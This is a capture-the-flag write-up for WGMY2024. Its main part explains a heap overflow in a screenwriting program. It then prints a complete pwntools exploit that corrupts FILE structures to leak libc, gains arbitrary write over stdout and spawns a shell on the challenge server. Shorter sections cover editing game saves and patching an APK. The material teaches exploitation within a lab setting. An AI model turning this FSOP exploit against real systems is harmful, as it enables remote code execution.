# WGMY2024

## Table of Contents
- [pwn/screenwriter](#pwnscreenwriter)
- [game/world 1](#gameworld-1)
- [game/world 2](#gameworld-2)
- [rev/stones](#revstones)
- [rev/sudoku](#revsudoku)

## Pwn/Screenwriter

Challenge Description : Use our software to craft your next blockbuster hit!

Challenge Summary : This challenge involves overwriting the FILE struct to gain arbitrary read and write

<details>
<summary>Source Code</summary>

```c
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void init(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    return;
}

void menu(){
    puts("1. Set screenwriter name");
    puts("2. Write script");
    puts("3. View reference");
    puts("4. Exit");
}

int get_choice(){
    char tmp[5] = "";
    printf("Choice: ");
    fgets(tmp,4,stdin);
    return atoi(tmp);
}

void main(){
    init();
    char* name = malloc(0x28);
    FILE *ref_script = fopen("bee-movie.txt","r");
    FILE *own_script = fopen("script.txt","w");
    puts("Welcome to our latest screenwriting program!");
    
    while (true){
        int choice = 0;
        menu();

        switch (get_choice()) {
            case 1:
                printf("What's your name: ");
                read(0,name,0x280);
                break;        

            case 2:
                char own_buf[0x101] = "";
                printf("Your masterpiece: ");
                read(0,own_buf,0x100);
                fwrite(own_buf,1,0x100,own_script);
                break;

            case 3:
                char ref_buf[0x11] = "";
                memset(ref_buf,0,0x11);
                fread(ref_buf,1,0x10,ref_script);
                puts("From the reference:");
                puts(ref_buf);
                break;

            default:
                printf("Goodbye %s",name);
                exit(0);
        }
    }
}
```

</details>

Looking at the source code, we can see an obvious buffer overflow in option 1 which lets us overwrite data in the heap. However, it is not immediately clear what we are suppose to overwrite.

![image](https://github.com/user-attachments/assets/34f34683-5893-4583-8a32-cc9c67c230cc)

Looking at it in gdb, we can see our name chunk with size 0x31 at the top. After that, theres another chunk with size 0x1e1 followed by the value 0xfbad2488. When I saw this value, FSOP immediately came to mind. What is a FILE struct? Lets let @Ren explain 

![image](https://github.com/user-attachments/assets/9614f272-4910-4799-9d79-8f3a70ec1e0d)

You can take a look at the definition in [elixir bootlin](https://elixir.bootlin.com/linux/v6.12.6/source)

<details>
<summary>FILE Struct</summary>

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

</details>

The FILE Struct contains many fields which manage buffering.

### Analysis

![image](https://github.com/user-attachments/assets/03c4a9dd-ef7a-4ef6-a6df-42a5cf45204f)

After using option 3, we can see that the struct is now populated with values.

![image](https://github.com/user-attachments/assets/d9123403-d0ad-450e-b409-864d182c755a)

The contents of the bee script is read into 0x405690 which corresponds to the values in the struct above. Now, our goal will be to overwrite the pointers on the struct to trick it into thinking theres a buffer located somewhere else. Then we will use option 3 to leak this value. Our target will be the GOT entry of puts()

```
GOT protection: Full RelRO | GOT functions: 13

[0x403f88] puts@GLIBC_2.2.5  →  0x7ffff7c80ed0
```

```py
payload = b"A" * 0x28
payload += p64(0x1e1)
payload += p64(0xfbad2488)
payload += p64(0x403f88)
payload += p64(0x404f88)
payload += p64(0x403f88) * 5
payload += p64(0x404f88)
```

![image](https://github.com/user-attachments/assets/32f89dfc-24e7-4817-abcd-78f7ad8980bd)

Now that we know where is libc, maybe we can spawn a shell on the server. To do that, we need to be able to freely write anywhere in memory. Luckily for us, there is a 2nd file struct which lets us write data. Now, we should overwrite the struct fields to trick libc into thinking that the buffer is located somewhere else. But where should we write to? I used [angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/) to spawn shell on server. 

### Getting Arbitrary Write

```py
payload = b"A" * (0x198 + 0x70)
payload += p64(0x1e1)
payload += p64(0xfbad2c84)
payload += p64(stdout) 
payload += p64(0x0) * 5
payload += p64(stdout)
payload += p64(stdout + 0x1000)
```

![image](https://github.com/user-attachments/assets/52214079-50ad-4ed1-92da-b9907e244482)

Now, the buffer for our write is located at `_IO_2_1_stdout_`. The next thing to do would be to overwrite stdout with our payload.

![image](https://github.com/user-attachments/assets/ed3c8a0d-a18c-4f47-aca7-60b5718e81c0)

<details>
<summary>Solve Script</summary>

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./chall_patched')
libc = exe.libc

host = "43.216.119.115"
port = 32782

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

sla(b"Choice: ", "3")

payload = b"A" * 0x28
payload += p64(0x1e1)
payload += p64(0xfbad2488)
payload += p64(0x403f88)
payload += p64(0x404f88)
payload += p64(0x403f88) * 5
payload += p64(0x404f88)

sla(b"Choice: ", "1")
s(payload)
sla(b"Choice: ", "3")

ru(b"reference:\n")
libc.address = u64(rl() + b"\x00\x00") - (0x7f9149c80ed0 - 0x00007f9149c00000)
environ = libc.sym["environ"]
li(f"Libc base @ {hex(libc.address)}")

stdout_lock = libc.address + 0x21ba70
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x0000000000163830

payload = b"A" * (0x198 + 0x70)
payload += p64(0x1e1)
payload += p64(0xfbad2c84)
payload += p64(stdout) 
payload += p64(0x0) * 5
payload += p64(stdout)
payload += p64(stdout + 0x1000)

print(hex(len(payload)))
sla(b"Choice: ", "1")
s(payload)

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

print(hex(len(bytes(fake))))
sla(b"Choice: ", "2")
s(bytes(fake))

# debug()

p.interactive()
```

</details>

### Side Note

There are multiple ways to solve this challenge, potentially overwriting the return address of read() or overwriting the exit functions handler with a one gadget. I tried both but it didnt work for me so I guess its a skill issue. Though, I was very satisfied with this because its my first time solving a FSOP challenge after reading writeups about it.

## Game/World 1

When saving the game, we get a RMMZSave file which we can edit using this [Save Edit](https://www.saveeditonline.com/)

![image](https://github.com/user-attachments/assets/dcad718c-1093-455f-9ccf-97b2d4f7ccff)

Then, just play the game and one shot the bosses to get all the flag. Flag 1, 2 and 3 is obtainable by killing the boss. Flag 4 can be obtained by killing the lava world boss and walking back out. The flag is written on the floor. The final flag is obtained by unlocking the chest and entering the password "wgmy". Hints about the password is given as "23 7 13 25".

## Game/World 2

Open the apk in APKLab and look for interesting things. One thing I found was the Enemies.json

![image](https://github.com/user-attachments/assets/1129c465-dc52-4921-a649-cdac2b4fed99)

`"params":[600,0,20,20,20,20,20,20]`

I assumed the params are the stats of the monster and just modified the biggest number (assuming to be HP) to 1. Then, recompile the APK and sign it. Then install the game in BlueStacks and play through the game to get all the flags. Flags are obtained in the same way as World 1

## Rev/Stones

## Rev/Sudoku
